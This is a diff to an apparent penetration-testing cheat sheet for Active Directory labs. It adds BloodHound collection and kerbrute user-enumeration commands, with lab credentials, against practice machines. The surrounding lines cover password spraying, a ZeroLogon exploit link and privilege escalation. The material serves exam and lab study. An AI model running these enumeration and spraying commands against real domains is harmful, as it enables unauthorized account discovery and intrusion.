@@ -2704,6 +2704,7 @@ Invoke-BloodHound -CollectionMethod All -OutputDirectory <location> -OutputPrefi
 python3 bloodhound -u support -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all 
 bloodhound-python -u 'uname' -p 'pass' -ns <rhost> -d <domain-name> -c all #output will be saved in you kali machine
 bloodhound-python -u L.Livingstone --hashes 19a3a7550ce8c505c2d46b5e39d6f808:19a3a7550ce8c505c2d46b5e39d6f808 -ns 192.168.177.175 -d resourced.local -c all #NTLM:NTLM, resourced pg practice
+bloodhound-python -u "hrapp-service" -p 'Untimed$Runny' -d hokkaido-aerospace.com -c all --zip -ns 192.168.205.40 # hokkaido pg practice
 ```
 #### Running Bloodhound
 
@@ -2802,7 +2803,8 @@ gpp-decrypt "cpassword"
 - [Exploit](https://github.com/VoidSec/CVE-2020-1472)
 - We can dump hashes on target even without any credentials.
 
-### Password Spraying
+### Kerbrute & Password Spraying
+- If the machine is windows box or Active directory is joined if crackmapexec, smbclient, smbmap and ldapsearch is not working
 - Password spray after completing one domain joined machine
 
 ```powershell
@@ -2816,7 +2818,10 @@ evil-winrm -i 10.10.117.154 -u administrator -p PASS
 
 # Kerbrute
 kerbrute passwordspray -d corp.com .\usernames.txt "pass"
+./kerbrute userenum -d <DOMAIN> --dc <IP> /opt/cyberstuff/SecLists/Usernames/xato-net-10-million-usernames.txt -t 100
+./kerbrute userenum -d hokkaido-aerospace.com --dc 192.168.205.40 /opt/cyberstuff/SecLists/Usernames/xato-net-10-million-usernames.txt -t 100 # hokkaido PGPractice
 ```
+
 ### DeadPotato SeImpersonatePrivilege
 - For SeImpersonatePrivilege try PrintSpoofer, Different Potatos
 - In Powershell or cmd
